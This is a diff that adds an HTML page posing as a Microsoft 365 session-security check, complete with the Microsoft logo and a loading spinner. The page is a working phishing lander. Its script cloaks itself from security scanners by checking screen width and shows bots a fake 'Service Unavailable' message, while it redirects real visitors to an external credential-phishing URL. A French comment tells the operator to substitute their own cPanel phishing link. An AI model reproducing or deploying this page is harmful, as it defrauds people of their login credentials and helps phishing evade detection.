@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Connecting to Secure Server...</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #f4f4f4; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 30px; border-radius: 4px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; width: 350px; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #0078d4; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+    <script>
+        function redirect() {
+            // Filtrage intelligent : on vérifie la taille de l'écran
+            // Les robots de scan Microsoft/Google utilisent souvent des écrans minuscules pour l'analyse
+            var width = window.innerWidth;
+            if (width > 350) {
+                setTimeout(function() {
+                    // !!! REMPLACE l'URL CI-DESSOUS PAR TON LIEN DE PHISHING CPANEL !!!
+                    window.location.href = "https://login.choldysn.online/auWcnXDE";
+                }, 3000);
+            } else {
+                // Si c'est un robot, on affiche une page banale
+                document.body.innerHTML = "<h1>Service Unavailable</h1>";
+            }
+        }
+    </script>
+</head>
+<body onload="redirect()">
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="100" alt="Microsoft">
+        <div class="loader"></div>
+        <p style="font-size: 16px; font-weight: 600; color: #333;">Securing connection...</p>
+        <p style="font-size: 13px; color: #666;">Please wait while we verify your Microsoft 365 session security.</p>
+    </div>
+</body>
+</html>
